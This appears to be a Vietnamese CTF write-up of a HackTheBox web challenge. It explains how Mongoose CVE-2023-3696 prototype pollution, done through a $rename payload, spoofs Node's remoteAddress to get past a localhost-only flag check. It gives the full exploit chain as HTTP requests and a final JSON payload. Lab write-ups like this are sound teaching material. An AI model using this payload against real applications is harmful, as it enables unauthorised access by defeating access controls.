---
layout: single
title: "Secure Notes"
date: 2026-03-12 15:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Prototype Pollution , Challenge ,Hackthebox]
---
# Secure Notes - Easy - Web

## Tổng quan

Bài `secure_notes` là một web challenge Node.js + MongoDB, với 2 ý chính phải ghép lại với nhau:

1. Mongoose `7.2.4` dính `CVE-2023-3696`, cho phép prototype pollution thông qua các hàm update như `findByIdAndUpdate()`.
2. Route `/flag` không tin vào header, mà kiểm tra `req.connection.remoteAddress` để chỉ cho localhost đọc flag.

Điểm hay của bài là primitive prototype pollution không phải pollute `remoteAddress` trực tiếp, mà phải pollute đúng field nội bộ mà Node dùng để tính ra `remoteAddress`.

Dependency trong `challenge/src/package.json`:

```json
"dependencies": {
  "express": "^4.18.2",
  "mongoose": "^7.2.4"
}
```

Phiên bản `mongoose 7.2.4` nằm trong range bị ảnh hưởng bởi `CVE-2023-3696`.

## Phân tích route `/flag`

Đoạn code kiểm tra quyền truy cập:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    console.log(`Request from ${remoteAddress}`);
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

Nhìn bề ngoài, đây là một check khá chặt vì nó không dùng `X-Forwarded-For` hay các header dễ giả mạo. Nếu chỉ nghĩ theo hướng SSRF hoặc spoof header thì sẽ không đi tới đâu.

Mấu chốt là phải tìm cách làm cho `req.connection.remoteAddress` trả về giá trị localhost dù request thực đến từ bên ngoài.

## Sink gây prototype pollution

Route `/update` là chỗ lỗi xảy ra:

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

Có hai vấn đề cùng xuất hiện ở đây:

1. `req.body` được truyền thẳng vào `findByIdAndUpdate()` mà không whitelist field nào.
2. Sau update, code gọi `Note.find({ _id: noteId })` ngay lập tức, và chính bước đọc này kích hoạt pollution trong Mongoose.

Theo `CVE-2023-3696`, có thể dùng toán tử `$rename` để đổi tên một field hiện có sang đường dẫn prototype như `__proto__.something`.

Ví dụ primitive kinh điển:

```json
{
  "$rename": {
    "title": "__proto__.polluted"
  }
}
```

Sau khi Mongoose xử lý document bị đổi tên và thực hiện một lần đọc document, `Object.prototype.polluted` có thể xuất hiện.

## Vì sao pollute `remoteAddress` trực tiếp không đủ

Phản xạ đầu tiên thường là thử pollute:

```json
{
  "$rename": {
    "title": "__proto__.remoteAddress"
  }
}
```

Nhưng cách này không qua được route `/flag`.

Lý do là `req.connection` là một `net.Socket`, và `remoteAddress` không phải property bình thường nằm ở `Object.prototype`. Nó là getter nằm trên `Socket.prototype`.

Getter này có logic tương đương:

```js
function remoteAddress() {
  return this._getpeername().address;
}
```

Và `_getpeername()` có logic dạng:

```js
function() {
  if (!this._handle || !this._handle.getpeername || this.connecting) {
    return this._peername || {};
  } else if (!this._peername) {
    const out = {};
    const err = this._handle.getpeername(out);
    if (err) return out;
    this._peername = out;
  }
  return this._peername;
}
```

Điểm quan trọng là getter `remoteAddress` luôn tồn tại trên `Socket.prototype`, nên dù có pollute `Object.prototype.remoteAddress`, JavaScript vẫn lấy getter ở prototype gần hơn trước. Nói ngắn gọn: `Object.prototype.remoteAddress` không override được `Socket.prototype.remoteAddress`.

## Primitive đúng: pollute `_peername.address`

Muốn điều khiển kết quả của `req.connection.remoteAddress`, phải đi vào đúng object mà getter đang đọc tới.

Getter trả về:

```js
this._getpeername().address
```

Nếu có thể làm cho `this._peername` được kế thừa từ `Object.prototype`, thì `_getpeername()` sẽ trả về object đó thay vì lấy peername thật từ socket handle.

Vì vậy primitive đúng là:

```json
{
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

Khi đó:

- `title` của note đang chứa chuỗi `127.0.0.1`
- `$rename` đẩy giá trị này vào `Object.prototype._peername.address`
- ở request kế tiếp tới `/flag`, `req.connection._peername` được kế thừa từ `Object.prototype`
- getter `remoteAddress` trả về `127.0.0.1`
- check localhost pass


## Chuỗi exploit đầy đủ

### Bước 1: tạo note chứa giá trị localhost

Tạo note với `title = 127.0.0.1`:

```http
POST /create HTTP/1.1
Content-Type: application/json

{"title":"127.0.0.1","content":"seed"}
```

Response sẽ trả về `_id` của note.

### Bước 2: prototype pollution qua `$rename`

Dùng `_id` vừa lấy được để gửi request update:

```http
POST /update HTTP/1.1
Content-Type: application/json

{
  "noteId": "<NOTE_ID>",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

Request này làm 2 việc:

1. `findByIdAndUpdate()` xử lý `$rename` và chuẩn bị dữ liệu độc hại.
2. `Note.find({ _id: noteId })` ở ngay dòng sau kích hoạt prototype pollution.

### Bước 3: gọi `/flag`

Sau đó chỉ cần request:

```http
GET /flag HTTP/1.1
```

Server sẽ thấy:

```js
req.connection.remoteAddress === '127.0.0.1'
```

và trả flag.

## Root cause

1. Dùng phiên bản Mongoose vulnerable.
2. Cho phép truyền raw `req.body` vào `findByIdAndUpdate()`.
3. Dùng giá trị từ object runtime nội bộ của Node (`req.connection.remoteAddress`) như một access control primitive, trong khi object đó vẫn chịu ảnh hưởng từ prototype chain của JavaScript.


Đây là một challenge cần chain 2 tầng kiến thức khác nhau:

1. Kiến thức về Mongoose prototype pollution qua `CVE-2023-3696`.
2. Kiến thức về cách Node.js tính `req.connection.remoteAddress` từ `_peername.address`.

Payload cuối cùng:

```json
{
  "noteId": "<NOTE_ID>",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```
